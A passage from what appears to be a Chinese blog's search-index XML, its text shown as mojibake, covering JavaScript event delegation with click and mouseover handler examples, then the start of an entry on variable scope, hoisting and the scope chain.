æ¯ä¸ªå‡½æ•°éƒ½æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œæ˜¯å¯¹è±¡å°±ä¼šå ç”¨å†…å­˜ï¼Œå¯¹è±¡è¶Šå¤šï¼Œå†…å­˜å ç”¨çŽ‡å°±è¶Šå¤§ï¼Œè‡ªç„¶æ€§èƒ½å°±è¶Šå·®äº†ï¼ˆå†…å­˜ä¸å¤Ÿç”¨ï¼Œæ˜¯ç¡¬ä¼¤ï¼Œå“ˆå“ˆï¼‰ï¼Œæ¯”å¦‚ä¸Šé¢çš„100ä¸ªliï¼Œå°±è¦å ç”¨100ä¸ªå†…å­˜ç©ºé—´ï¼Œå¦‚æžœæ˜¯1000ä¸ªï¼Œ10000ä¸ªå‘¢ï¼Œé‚£åªèƒ½è¯´å‘µå‘µäº†ï¼Œå¦‚æžœç”¨äº‹ä»¶å§”æ‰˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åªå¯¹å®ƒçš„çˆ¶çº§ï¼ˆå¦‚æžœåªæœ‰ä¸€ä¸ªçˆ¶çº§ï¼‰è¿™ä¸€ä¸ªå¯¹è±¡è¿›è¡Œæ“ä½œï¼Œè¿™æ ·æˆ‘ä»¬å°±éœ€è¦ä¸€ä¸ªå†…å­˜ç©ºé—´å°±å¤Ÿäº†ï¼Œæ˜¯ä¸æ˜¯çœäº†å¾ˆå¤šï¼Œè‡ªç„¶æ€§èƒ½å°±ä¼šæ›´å¥½ã€‚ äº‹ä»¶å§”æ‰˜çš„åŽŸç†äº‹ä»¶å§”æ‰˜æ˜¯åˆ©ç”¨äº‹ä»¶çš„å†’æ³¡åŽŸç†æ¥å®žçŽ°çš„ï¼Œä½•ä¸ºäº‹ä»¶å†’æ³¡å‘¢ï¼Ÿå°±æ˜¯äº‹ä»¶ä»Žæœ€æ·±çš„èŠ‚ç‚¹å¼€å§‹ï¼Œç„¶åŽé€æ­¥å‘ä¸Šä¼ æ’­äº‹ä»¶ï¼Œä¸¾ä¸ªä¾‹å­ï¼šé¡µé¢ä¸Šæœ‰è¿™ä¹ˆä¸€ä¸ªèŠ‚ç‚¹æ ‘ï¼Œdiv&gt;ul&gt;li&gt;a;æ¯”å¦‚ç»™æœ€é‡Œé¢çš„aåŠ ä¸€ä¸ªclickç‚¹å‡»äº‹ä»¶ï¼Œé‚£ä¹ˆè¿™ä¸ªäº‹ä»¶å°±ä¼šä¸€å±‚ä¸€å±‚çš„å¾€å¤–æ‰§è¡Œï¼Œæ‰§è¡Œé¡ºåºa&gt;li&gt;ul&gt;divï¼Œæœ‰è¿™æ ·ä¸€ä¸ªæœºåˆ¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç»™æœ€å¤–é¢çš„divåŠ ç‚¹å‡»äº‹ä»¶ï¼Œé‚£ä¹ˆé‡Œé¢çš„ulï¼Œliï¼Œaåšç‚¹å‡»äº‹ä»¶çš„æ—¶å€™ï¼Œéƒ½ä¼šå†’æ³¡åˆ°æœ€å¤–å±‚çš„divä¸Šï¼Œæ‰€ä»¥éƒ½ä¼šè§¦å‘ï¼Œè¿™å°±æ˜¯äº‹ä»¶å§”æ‰˜ï¼Œå§”æ‰˜å®ƒä»¬çˆ¶çº§ä»£ä¸ºæ‰§è¡Œäº‹ä»¶ã€‚ äº‹ä»¶å§”æ‰˜çš„å®žçŽ°å…ˆæ¥çœ‹ä¸€æ®µä¸€èˆ¬æ–¹æ³•çš„ä¾‹å­ 123456&lt;ul id="ul1"&gt; &lt;li&gt;111&lt;/li&gt; &lt;li&gt;222&lt;/li&gt; &lt;li&gt;333&lt;/li&gt; &lt;li&gt;444&lt;/li&gt;&lt;/ul&gt; å®žçŽ°åŠŸèƒ½æ˜¯ç‚¹å‡»liï¼Œå¼¹å‡º123 123456789window.onload = function()&#123; var oUl = document.getElementById("ul1"); var aLi = oUl.getElementsByTagName('li'); for(var i=0;i&lt;aLi.length;i++)&#123; aLi[i].onclick = function()&#123; alert(123); &#125; &#125;&#125; ä¸Šé¢çš„ä»£ç çš„æ„æ€å¾ˆç®€å•ï¼Œç›¸ä¿¡å¾ˆå¤šäººéƒ½æ˜¯è¿™ä¹ˆå®žçŽ°çš„ï¼Œæˆ‘ä»¬çœ‹çœ‹æœ‰å¤šå°‘æ¬¡çš„domæ“ä½œï¼Œé¦–å…ˆè¦æ‰¾åˆ°ulï¼Œç„¶åŽéåŽ†liï¼Œç„¶åŽç‚¹å‡»liçš„æ—¶å€™ï¼Œåˆè¦æ‰¾ä¸€æ¬¡ç›®æ ‡çš„liçš„ä½ç½®ï¼Œæ‰èƒ½æ‰§è¡Œæœ€åŽçš„æ“ä½œï¼Œæ¯æ¬¡ç‚¹å‡»éƒ½è¦æ‰¾ä¸€æ¬¡liï¼› é‚£ä¹ˆæˆ‘ä»¬ç”¨äº‹ä»¶å§”æ‰˜çš„æ–¹å¼åšåˆä¼šæ€Žä¹ˆæ ·å‘¢ï¼Ÿ 123456window.onload = function()&#123;var oUl = document.getElementById("ul1");oUl.onclick = function()&#123; alert(123); &#125;&#125; é‡Œç”¨çˆ¶çº§ulåšäº‹ä»¶å¤„ç†ï¼Œå½“liè¢«ç‚¹å‡»æ—¶ï¼Œç”±äºŽå†’æ³¡åŽŸç†ï¼Œäº‹ä»¶å°±ä¼šå†’æ³¡åˆ°ulä¸Šï¼Œå› ä¸ºulä¸Šæœ‰ç‚¹å‡»äº‹ä»¶ï¼Œæ‰€ä»¥äº‹ä»¶å°±ä¼šè§¦å‘ï¼Œå½“ç„¶ï¼Œè¿™é‡Œå½“ç‚¹å‡»ulçš„æ—¶å€™ï¼Œä¹Ÿæ˜¯ä¼šè§¦å‘çš„ï¼Œé‚£ä¹ˆé—®é¢˜å°±æ¥äº†ï¼Œå¦‚æžœæˆ‘æƒ³è®©äº‹ä»¶ä»£ç†çš„æ•ˆæžœè·Ÿç›´æŽ¥ç»™èŠ‚ç‚¹çš„äº‹ä»¶æ•ˆæžœä¸€æ ·æ€Žä¹ˆåŠžï¼Œæ¯”å¦‚è¯´åªæœ‰ç‚¹å‡»liæ‰ä¼šè§¦å‘ï¼Œä¸æ€•ï¼Œæˆ‘ä»¬æœ‰ç»æ‹›ï¼š Eventå¯¹è±¡æä¾›äº†ä¸€ä¸ªå±žæ€§å«targetï¼Œå¯ä»¥è¿”å›žäº‹ä»¶çš„ç›®æ ‡èŠ‚ç‚¹ï¼Œæˆ‘ä»¬æˆä¸ºäº‹ä»¶æºï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œtargetå°±å¯ä»¥è¡¨ç¤ºä¸ºå½“å‰çš„äº‹ä»¶æ“ä½œçš„domï¼Œä½†æ˜¯ä¸æ˜¯çœŸæ­£æ“ä½œdomï¼Œå½“ç„¶ï¼Œè¿™ä¸ªæ˜¯æœ‰å…¼å®¹æ€§çš„ï¼Œæ ‡å‡†æµè§ˆå™¨ç”¨ev.targetï¼ŒIEæµè§ˆå™¨ç”¨event.srcElementï¼Œæ­¤æ—¶åªæ˜¯èŽ·å–äº†å½“å‰èŠ‚ç‚¹çš„ä½ç½®ï¼Œå¹¶ä¸çŸ¥é“æ˜¯ä»€ä¹ˆèŠ‚ç‚¹åç§°ï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨nodeNameæ¥èŽ·å–å…·ä½“æ˜¯ä»€ä¹ˆæ ‡ç­¾åï¼Œè¿™ä¸ªè¿”å›žçš„æ˜¯ä¸€ä¸ªå¤§å†™çš„ï¼Œæˆ‘ä»¬éœ€è¦è½¬æˆå°å†™å†åšæ¯”è¾ƒï¼ˆä¹ æƒ¯é—®é¢˜ï¼‰ï¼š 1234567891011window.onload = function()&#123; var oUl = document.getElementById("ul1"); oUl.onclick = function(ev)&#123; var ev = ev || window.event; var target = ev.target || ev.srcElement; if(target.nodeName.toLowerCase() == 'li')&#123; alert(123); alert(target.innerHTML); &#125; &#125;&#125; è¿™æ ·æ”¹ä¸‹å°±åªæœ‰ç‚¹å‡»liä¼šè§¦å‘äº‹ä»¶äº†ï¼Œä¸”æ¯æ¬¡åªæ‰§è¡Œä¸€æ¬¡domæ“ä½œï¼Œå¦‚æžœliæ•°é‡å¾ˆå¤šçš„è¯ï¼Œå°†å¤§å¤§å‡å°‘domçš„æ“ä½œï¼Œä¼˜åŒ–çš„æ€§èƒ½å¯æƒ³è€ŒçŸ¥ï¼ ä¸Šé¢çš„ä¾‹å­æ˜¯è¯´liæ“ä½œçš„æ˜¯åŒæ ·çš„æ•ˆæžœï¼Œè¦æ˜¯æ¯ä¸ªliè¢«ç‚¹å‡»çš„æ•ˆæžœéƒ½ä¸ä¸€æ ·ï¼Œé‚£ä¹ˆç”¨äº‹ä»¶å§”æ‰˜è¿˜æœ‰ç”¨å—ï¼Ÿ 12345678910111213141516171819202122232425262728&lt;div id="box"&gt; &lt;input type="button" id="add" value="æ·»åŠ " /&gt; &lt;input type="button" id="remove" value="åˆ é™¤" /&gt; &lt;input type="button" id="move" value="ç§»åŠ¨" /&gt; &lt;input type="button" id="select" value="é€‰æ‹©" /&gt;&lt;/div&gt;&lt;script&gt; window.onload = function()&#123; var Add = document.getElementById("add"); var Remove = document.getElementById("remove"); var Move = document.getElementById("move"); var Select = document.getElementById("select"); Add.onclick = function()&#123; alert('æ·»åŠ '); &#125;; Remove.onclick = function()&#123; alert('åˆ é™¤'); &#125;; Move.onclick = function()&#123; alert('ç§»åŠ¨'); &#125;; Select.onclick = function()&#123; alert('é€‰æ‹©'); &#125; &#125;&lt;/script&gt; ä¸Šé¢å®žçŽ°çš„æ•ˆæžœæˆ‘å°±ä¸å¤šè¯´äº†ï¼Œå¾ˆç®€å•ï¼Œ4ä¸ªæŒ‰é’®ï¼Œç‚¹å‡»æ¯ä¸€ä¸ªåšä¸åŒçš„æ“ä½œï¼Œé‚£ä¹ˆè‡³å°‘éœ€è¦4æ¬¡domæ“ä½œï¼Œå¦‚æžœç”¨äº‹ä»¶å§”æ‰˜ï¼Œèƒ½è¿›è¡Œä¼˜åŒ–å—ï¼Ÿ 123456789101112131415161718192021222324window.onload = function()&#123; var oBox = document.getElementById("box"); oBox.onclick = function (ev) &#123; var ev = ev || window.event; var target = ev.target || ev.srcElement; if(target.nodeName.toLocaleLowerCase() == 'input')&#123; switch(target.id)&#123; case 'add' : alert('æ·»åŠ '); break; case 'remove' : alert('åˆ é™¤'); break; case 'move' : alert('ç§»åŠ¨'); break; case 'select' : alert('é€‰æ‹©'); break; &#125; &#125; &#125; &#125; ç”¨äº‹ä»¶å§”æ‰˜å°±å¯ä»¥åªç”¨ä¸€æ¬¡domæ“ä½œå°±èƒ½å®Œæˆæ‰€æœ‰çš„æ•ˆæžœï¼Œæ¯”ä¸Šé¢çš„æ€§èƒ½è‚¯å®šæ˜¯è¦å¥½ä¸€äº›çš„ çŽ°åœ¨è®²çš„éƒ½æ˜¯documentåŠ è½½å®Œæˆçš„çŽ°æœ‰domèŠ‚ç‚¹ä¸‹çš„æ“ä½œï¼Œé‚£ä¹ˆå¦‚æžœæ˜¯æ–°å¢žçš„èŠ‚ç‚¹ï¼Œæ–°å¢žçš„èŠ‚ç‚¹ä¼šæœ‰äº‹ä»¶å—ï¼Ÿä¹Ÿå°±æ˜¯è¯´ï¼Œä¸€ä¸ªæ–°å‘˜å·¥æ¥äº†ï¼Œä»–èƒ½æ”¶åˆ°å¿«é€’å—ï¼Ÿ çœ‹ä¸€ä¸‹æ­£å¸¸çš„æ·»åŠ èŠ‚ç‚¹çš„æ–¹æ³•ï¼š 1234567&lt;input type="button" name="" id="btn" value="æ·»åŠ " /&gt;&lt;ul id="ul1"&gt; &lt;li&gt;111&lt;/li&gt; &lt;li&gt;222&lt;/li&gt; &lt;li&gt;333&lt;/li&gt; &lt;li&gt;444&lt;/li&gt;&lt;/ul&gt; çŽ°åœ¨æ˜¯ç§»å…¥liï¼Œliå˜çº¢ï¼Œç§»å‡ºliï¼Œliå˜ç™½ï¼Œè¿™ä¹ˆä¸€ä¸ªæ•ˆæžœï¼Œç„¶åŽç‚¹å‡»æŒ‰é’®ï¼Œå¯ä»¥å‘ulä¸­æ·»åŠ ä¸€ä¸ªliå­èŠ‚ç‚¹ 1234567891011121314151617181920212223window.onload = function()&#123; var oBtn = document.getElementById("btn"); var oUl = document.getElementById("ul1"); var aLi = oUl.getElementsByTagName('li'); var num = 4; //é¼ æ ‡ç§»å…¥å˜çº¢ï¼Œç§»å‡ºå˜ç™½ for(var i=0; i&lt;aLi.length;i++)&#123; aLi[i].onmouseover = function()&#123; this.style.background = 'red'; &#125;; aLi[i].onmouseout = function()&#123; this.style.background = '#fff'; &#125; &#125; //æ·»åŠ æ–°èŠ‚ç‚¹ oBtn.onclick = function()&#123; num++; var oLi = document.createElement('li'); oLi.innerHTML = 111*num; oUl.appendChild(oLi); &#125;;&#125; è¿™æ˜¯ä¸€èˆ¬çš„åšæ³•ï¼Œä½†æ˜¯ä½ ä¼šå‘çŽ°ï¼Œæ–°å¢žçš„liæ˜¯æ²¡æœ‰äº‹ä»¶çš„ï¼Œè¯´æ˜Žæ·»åŠ å­èŠ‚ç‚¹çš„æ—¶å€™ï¼Œäº‹ä»¶æ²¡æœ‰ä¸€èµ·æ·»åŠ è¿›åŽ»ï¼Œè¿™ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ç»“æžœï¼Œé‚£æ€Žä¹ˆåšå‘¢ï¼Ÿä¸€èˆ¬çš„è§£å†³æ–¹æ¡ˆä¼šæ˜¯è¿™æ ·ï¼Œå°†forå¾ªçŽ¯ç”¨ä¸€ä¸ªå‡½æ•°åŒ…èµ·æ¥ï¼Œå‘½åä¸ºmHoverï¼Œå¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627window.onload = function()&#123; var oBtn = document.getElementById("btn"); var oUl = document.getElementById("ul1"); var aLi = oUl.getElementsByTagName('li'); var num = 4; function mHover () &#123; //é¼ æ ‡ç§»å…¥å˜çº¢ï¼Œç§»å‡ºå˜ç™½ for(var i=0; i&lt;aLi.length;i++)&#123; aLi[i].onmouseover = function()&#123; this.style.background = 'red'; &#125;; aLi[i].onmouseout = function()&#123; this.style.background = '#fff'; &#125; &#125; &#125; mHover (); //æ·»åŠ æ–°èŠ‚ç‚¹ oBtn.onclick = function()&#123; num++; var oLi = document.createElement('li'); oLi.innerHTML = 111*num; oUl.appendChild(oLi); mHover (); &#125;;&#125; è™½ç„¶åŠŸèƒ½å®žçŽ°äº†ï¼Œçœ‹ç€è¿˜æŒºå¥½ï¼Œä½†å®žé™…ä¸Šæ— ç–‘æ˜¯åˆå¢žåŠ äº†ä¸€ä¸ªdomæ“ä½œï¼Œåœ¨ä¼˜åŒ–æ€§èƒ½æ–¹é¢æ˜¯ä¸å¯å–çš„ï¼Œé‚£ä¹ˆæœ‰äº‹ä»¶å§”æ‰˜çš„æ–¹å¼ï¼Œèƒ½åšåˆ°ä¼˜åŒ–å—ï¼Ÿ 1234567891011121314151617181920212223242526272829303132window.onload = function()&#123; var oBtn = document.getElementById("btn"); var oUl = document.getElementById("ul1"); var aLi = oUl.getElementsByTagName('li'); var num = 4; //äº‹ä»¶å§”æ‰˜ï¼Œæ·»åŠ çš„å­å…ƒç´ ä¹Ÿæœ‰äº‹ä»¶ oUl.onmouseover = function(ev)&#123; var ev = ev || window.event; var target = ev.target || ev.srcElement; if(target.nodeName.toLowerCase() == 'li')&#123; target.style.background = "red"; &#125; &#125;; oUl.onmouseout = function(ev)&#123; var ev = ev || window.event; var target = ev.target || ev.srcElement; if(target.nodeName.toLowerCase() == 'li')&#123; target.style.background = "#fff"; &#125; &#125;; //æ·»åŠ æ–°èŠ‚ç‚¹ oBtn.onclick = function()&#123; num++; var oLi = document.createElement('li'); oLi.innerHTML = 111*num; oUl.appendChild(oLi); &#125;;&#125; çœ‹ï¼Œä¸Šé¢æ˜¯ç”¨äº‹ä»¶å§”æ‰˜çš„æ–¹å¼ï¼Œæ–°æ·»åŠ çš„å­å…ƒç´ æ˜¯å¸¦æœ‰äº‹ä»¶æ•ˆæžœçš„ï¼Œæˆ‘ä»¬å¯ä»¥å‘çŽ°ï¼Œå½“ç”¨äº‹ä»¶å§”æ‰˜çš„æ—¶å€™ï¼Œæ ¹æœ¬å°±ä¸éœ€è¦åŽ»éåŽ†å…ƒç´ çš„å­èŠ‚ç‚¹ï¼Œåªéœ€è¦ç»™çˆ¶çº§å…ƒç´ æ·»åŠ äº‹ä»¶å°±å¥½äº†ï¼Œå…¶ä»–çš„éƒ½æ˜¯åœ¨jsé‡Œé¢çš„æ‰§è¡Œï¼Œè¿™æ ·å¯ä»¥å¤§å¤§çš„å‡å°‘domæ“ä½œï¼Œè¿™æ‰æ˜¯äº‹ä»¶å§”æ‰˜çš„ç²¾é«“æ‰€åœ¨ã€‚ çŽ°åœ¨ç»™ä¸€ä¸ªåœºæ™¯ ul &gt; li &gt; div &gt; pï¼Œdivå æ»¡liï¼Œpå æ»¡divï¼Œè¿˜æ˜¯ç»™ulç»‘å®šæ—¶é—´ï¼Œéœ€è¦åˆ¤æ–­ç‚¹å‡»çš„æ˜¯ä¸æ˜¯liï¼ˆå‡è®¾lié‡Œé¢çš„ç»“æž„æ˜¯ä¸å›ºå®šçš„ï¼‰ï¼Œé‚£ä¹ˆe.targetå°±å¯èƒ½æ˜¯pï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯divï¼Œè¿™ç§æƒ…å†µä½ ä¼šæ€Žä¹ˆå¤„ç†å‘¢ï¼Ÿ 12345678910111213&lt;ul id="test"&gt; &lt;li&gt; &lt;p&gt;11111111111&lt;/p&gt; &lt;/li&gt; &lt;li&gt; &lt;div&gt; &lt;/div&gt; &lt;/li&gt; &lt;li&gt; &lt;span&gt;3333333333&lt;/span&gt; &lt;/li&gt; &lt;li&gt;4444444&lt;/li&gt;&lt;/ul&gt; å¦‚ä¸Šåˆ—è¡¨ï¼Œæœ‰4ä¸ªliï¼Œé‡Œé¢çš„å†…å®¹å„ä¸ç›¸åŒï¼Œç‚¹å‡»liï¼Œeventå¯¹è±¡è‚¯å®šæ˜¯å½“å‰ç‚¹å‡»çš„å¯¹è±¡ï¼Œæ€Žä¹ˆæŒ‡å®šåˆ°liä¸Šï¼Œä¸‹é¢æˆ‘ç›´æŽ¥ç»™è§£å†³æ–¹æ¡ˆï¼š 1234567891011var oUl = document.getElementById('test');oUl.addEventListener('click',function(ev)&#123; var target = ev.target; while(target !== oUl )&#123; if(target.tagName.toLowerCase() == 'li')&#123; console.log('li click~'); break; &#125; target = target.parentNode; &#125;&#125;) æ ¸å¿ƒä»£ç æ˜¯whileå¾ªçŽ¯éƒ¨åˆ†ï¼Œå®žé™…ä¸Šå°±æ˜¯ä¸€ä¸ªé€’å½’è°ƒç”¨ï¼Œä½ ä¹Ÿå¯ä»¥å†™æˆä¸€ä¸ªå‡½æ•°ï¼Œç”¨é€’å½’çš„æ–¹æ³•æ¥è°ƒç”¨ï¼ŒåŒæ—¶ç”¨åˆ°å†’æ³¡çš„åŽŸç†ï¼Œä»Žé‡Œå¾€å¤–å†’æ³¡ï¼ŒçŸ¥é“currentTargetä¸ºæ­¢ï¼Œå½“å½“å‰çš„targetæ˜¯liçš„æ—¶å€™ï¼Œå°±å¯ä»¥æ‰§è¡Œå¯¹åº”çš„äº‹ä»¶äº†ï¼Œç„¶åŽç»ˆæ­¢å¾ªçŽ¯ æ€»ç»“é€‚åˆç”¨äº‹ä»¶å§”æ‰˜çš„äº‹ä»¶ï¼šclickï¼Œmousedownï¼Œmouseupï¼Œkeydownï¼Œkeyupï¼Œkeypressã€‚ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œmouseoverå’Œmouseoutè™½ç„¶ä¹Ÿæœ‰äº‹ä»¶å†’æ³¡ï¼Œä½†æ˜¯å¤„ç†å®ƒä»¬çš„æ—¶å€™éœ€è¦ç‰¹åˆ«çš„æ³¨æ„ï¼Œå› ä¸ºéœ€è¦ç»å¸¸è®¡ç®—å®ƒä»¬çš„ä½ç½®ï¼Œå¤„ç†èµ·æ¥ä¸å¤ªå®¹æ˜“ã€‚ ä¸é€‚åˆçš„å°±æœ‰å¾ˆå¤šäº†ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œmousemoveï¼Œæ¯æ¬¡éƒ½è¦è®¡ç®—å®ƒçš„ä½ç½®ï¼Œéžå¸¸ä¸å¥½æŠŠæŽ§ï¼Œåœ¨ä¸å¦‚è¯´focusï¼Œblurä¹‹ç±»çš„ï¼Œæœ¬èº«å°±æ²¡ç”¨å†’æ³¡çš„ç‰¹æ€§ï¼Œè‡ªç„¶å°±ä¸èƒ½ç”¨äº‹ä»¶å§”æ‰˜äº†ã€‚]]></content>
      <categories>
        <category>javaScriptç›¸å…³</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jsä½œç”¨åŸŸ]]></title>
    <url>%2F2018-05-14-scopeChain.html</url>
    <content type="text"><![CDATA[jsçš„ä½œç”¨åŸŸä½œç”¨åŸŸä½œç”¨ï¼šè®¿é—®ã€æ“ä½œã€è°ƒç”¨..åŸŸï¼šåŒºåŸŸã€èŒƒå›´ã€ç©ºé—´ä½œç”¨åŸŸå°±æ˜¯å˜é‡å’Œå‡½æ•°çš„å¯è®¿é—®èŒƒå›´ï¼Œæˆ–è€…è¯´æ˜¯å˜é‡æˆ–è€…å‡½æ•°èµ·ä½œç”¨çš„åŒºåŸŸ 1.jså‡½æ•°çš„ä½œç”¨åŸŸå‡½æ•°å†…çš„åŒºåŸŸï¼Œå°±æ˜¯è¿™ä¸ªå‡½æ•°çš„ä½œç”¨åŸŸï¼Œå˜é‡å’Œå‡½æ•°åœ¨è¿™ä¸ªåŒºåŸŸå†…éƒ½å¯ä»¥è®¿é—®æ“ä½œã€‚æœ€å¤–å±‚å‡½æ•°å¤–çš„åŒºåŸŸå«å…¨å±€ä½œç”¨åŸŸï¼Œå‡½æ•°å†…çš„åŒºåŸŸå«å±€éƒ¨ä½œç”¨åŸŸ 2.jså˜é‡çš„ä½œç”¨åŸŸåœ¨æºä»£ç ä¸­å˜é‡æ‰€åœ¨çš„åŒºåŸŸå°±æ˜¯è¿™ä¸ªå˜é‡çš„ä½œç”¨åŸŸã€‚å˜é‡åœ¨è¿™ä¸ªåŒºåŸŸå†…å¯ä»¥è¢«è®¿é—®ã€‚åœ¨å…¨å±€ä½œç”¨åŸŸä¸Šå®šä¹‰çš„å˜é‡å«åšå…¨å±€å˜é‡ï¼Œåœ¨å‡½æ•°å†…éƒ¨å®šä¹‰çš„å˜é‡å«åšå±€éƒ¨å˜é‡ã€‚ å…¨å±€å˜é‡ä¸Žå±€éƒ¨å˜é‡â‘  å…¨å±€ä½œç”¨åŸŸï¼ˆGlobal Scopeï¼‰æœ€å¤–å±‚å‡½æ•°æˆ–è€…æœ€å¤–å±‚å‡½æ•°å®šä¹‰çš„å˜é‡å…·æœ‰å…¨å±€ä½œç”¨åŸŸ 12345var outer = 'outer';function fn()&#123; console.log(outer);&#125;fn(); //outer â‘¡ æ‰€æœ‰æœªå®šä¹‰ç›´æŽ¥èµ‹å€¼çš„å˜é‡è‡ªåŠ¨å£°æ˜Žä¸ºå…¨å±€ä½œç”¨åŸŸ 123456function fn()&#123; inner= 'inner'; &#125;fn();console.log(inner); //inner â‘¢ æ‰€æœ‰windowå¯¹è±¡çš„å±žæ€§æ‹¥æœ‰å…¨å±€ä½œç”¨åŸŸ å±€éƒ¨ä½œç”¨åŸŸï¼ˆLocal Scopeï¼‰å±€éƒ¨ä½œç”¨åŸŸä¸€èˆ¬åªåœ¨å›ºå®šçš„ä»£ç ç‰‡æ®µå¯ä»¥è®¿é—®åˆ°ï¼Œå¯¹äºŽå‡½æ•°å¤–éƒ¨æ˜¯æ— æ³•è®¿é—®çš„,æœ€å¸¸è§çš„ä¾‹å¦‚å‡½æ•°å†…éƒ¨ 123456function fn()&#123; var inner= 'inner'; &#125;fn();console.log(inner); //undefined æ³¨æ„ï¼šåªè¦å‡½æ•°å†…å®šä¹‰äº†ä¸€ä¸ªå±€éƒ¨å˜é‡ï¼Œå‡½æ•°åœ¨è§£æžçš„æ—¶å€™éƒ½ä¼šå°†è¿™ä¸ªå˜é‡æå‰å£°æ˜Ž 1234567var global = 'global';function fn()&#123; console.log(global); //undefined var global = 'newGlobal'; console.log(global); //newGlobal&#125;console.log(global); //global ç›¸å½“äºŽ 12345678var global = 'global';function fn()&#123; var global; //æå‰å£°æ˜Žäº†å±€éƒ¨å˜é‡ï¼› console.log(global); //undefined var global = 'newGlobal'; console.log(global); //newGlobal&#125;console.log(global); //global æ‰§è¡ŒçŽ¯å¢ƒï¼ˆExecution Contextsï¼‰ä¹Ÿå¯ä»¥ç¿»è¯‘ä¸ºæ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œå½“è§£é‡Šå™¨è¿›å…¥åˆ°ECMAScriptçš„å¯æ‰§è¡Œä»£ç ï¼Œè§£é‡Šå™¨å°±è¿›å…¥ä¸€ä¸ªæ‰§è¡ŒçŽ¯å¢ƒï¼Œæ´»åŠ¨çš„æ‰§è¡ŒçŽ¯å¢ƒç»„æˆäº†é€»è¾‘ä¸Šçš„ä¸€ä¸ªæ ˆï¼Œåœ¨è¿™ä¸ªé€»è¾‘æ ˆé¡¶éƒ¨çš„æ‰§è¡ŒçŽ¯å¢ƒæ˜¯å½“å‰è¿è¡Œçš„æ‰§è¡ŒçŽ¯å¢ƒã€‚jsä¸ºæ¯ä¸€ä¸ªæ‰§è¡ŒçŽ¯å¢ƒå…³è”äº†ä¸€ä¸ªå˜é‡å¯¹è±¡ï¼ŒçŽ¯å¢ƒä¸­å®šä¹‰çš„æ‰€æœ‰å˜é‡å’Œå‡½æ•°éƒ½ä¿å­˜åœ¨è¿™ä¸ªå¯¹è±¡ä¸­ã€‚jsçš„æ‰§è¡Œé¡ºåºæ˜¯æ ¹æ®å‡½æ•°çš„è°ƒç”¨æ¥å†³å®šçš„ï¼Œå½“ä¸€ä¸ªå‡½æ•°çš„å˜é‡å¯¹è±¡å¼¹å‡ºï¼ŒæŠŠæŽ§åˆ¶æƒäº¤ç»™äº†ä¹‹å‰çš„æ‰§è¡ŒçŽ¯å¢ƒå˜é‡å¯¹è±¡ã€‚ å˜é‡å¯¹è±¡(Variable Object)ã€æ´»åŠ¨å¯¹è±¡(Activation Object)å’ŒArgumentså¯¹è±¡(Arguments Object)å½“å‰æ‰§è¡ŒçŽ¯å¢ƒçš„å˜é‡å¯¹è±¡å§‹ç»ˆåœ¨ä½œç”¨åŸŸé“¾çš„ç¬¬0ä½ã€‚ è§£æžå™¨å¤„ç†ä»£ç æ—¶çš„ä¸¤ä¸ªé˜¶æ®µï¼š æˆ‘ä»¬éƒ½çŸ¥é“javascriptè§£æžå™¨æ˜¯ä¸€æ®µä¸€æ®µè§£æžå¤„ç†ä»£ç çš„ï¼Œä¸ºä»€ä¹ˆï¼Ÿè¿™å°±è¦æ¶‰åŠè§£æžå™¨å¤„ç†ä»£ç æ—¶çš„ä¸¤ä¸ªé˜¶æ®µï¼Œè§£æžä»£ç å’Œæ‰§è¡Œä»£ç ã€‚ å½“è§£æžå™¨è¿›å…¥æ‰§è¡ŒçŽ¯å¢ƒæ—¶ï¼Œå˜é‡å¯¹è±¡å°±ä¼šæ·»åŠ æ‰§è¡ŒçŽ¯å¢ƒä¸­å£°æ˜Žçš„å˜é‡å’Œå‡½æ•°ä½œä¸ºå®ƒçš„å±žæ€§ï¼Œè¿™å°±æ„å‘³ç€å˜é‡å’Œå‡½æ•°åœ¨å£°æ˜Žä¹‹å‰å·²ç»å¯ç”¨ï¼Œå˜é‡å€¼ä¸ºundefinedï¼Œè¿™å°±æ˜¯å˜é‡å’Œå‡½æ•°å£°æ˜Žæå‡(Hoisting)çš„åŽŸå› ï¼Œä¸Žæ­¤åŒæ—¶ä½œç”¨åŸŸé“¾å’Œthisç¡®å®šï¼Œæ­¤è¿‡ç¨‹ä¸ºè§£æžé˜¶æ®µï¼Œä¿—ç§°é¢„è§£æžã€‚æŽ¥ç€è§£æžå™¨å¼€å§‹æ‰§è¡Œä»£ç ï¼Œä¸ºå˜é‡æ·»åŠ ç›¸åº”å€¼çš„å¼•ç”¨ï¼Œå¾—åˆ°æ‰§è¡Œç»“æžœï¼Œæ­¤è¿‡ç¨‹ä¸ºæ‰§è¡Œé˜¶æ®µã€‚ ä½œç”¨åŸŸé“¾ï¼ˆScope Chainï¼‰ä½œç”¨åŸŸé“¾æ˜¯jså†…éƒ¨ä¸­ä¸€ç§å˜é‡ã€å‡½æ•°æŸ¥æ‰¾æœºåˆ¶ï¼Œå®ƒå†³å®šäº†å˜é‡å’Œå‡½æ•°çš„ä½œç”¨èŒƒå›´ï¼Œå³ä½œç”¨åŸŸã€‚å‡½æ•°å¯¹è±¡å’Œå…¶ä»–å¯¹è±¡ä¸€æ ·ï¼Œæ‹¥æœ‰å¯ä»¥é€šè¿‡ä»£ç è®¿é—®çš„å±žæ€§å’Œä¸€ç³»åˆ—ä»…ä¾›jså¼•æ“Žè®¿é—®çš„å†…éƒ¨å±žæ€§ã€‚å…¶ä¸­ä¸€ä¸ªå†…éƒ¨å±žæ€§å°±æ˜¯scopeï¼Œè¯¥å†…éƒ¨å±žæ€§åŒ…å«äº†å‡½æ•°è¢«åˆ›å»ºçš„ä½œç”¨åŸŸä¸­å¯¹è±¡çš„é›†åˆï¼Œè¿™ä¸ªé›†åˆå°±æ˜¯è¢«ç§°ä¸ºå‡½æ•°çš„ä½œç”¨åŸŸé“¾ï¼Œå†³å®šäº†é‚£äº›æ•°æ®èƒ½è¢«å‡½æ•°è®¿é—®ã€‚ 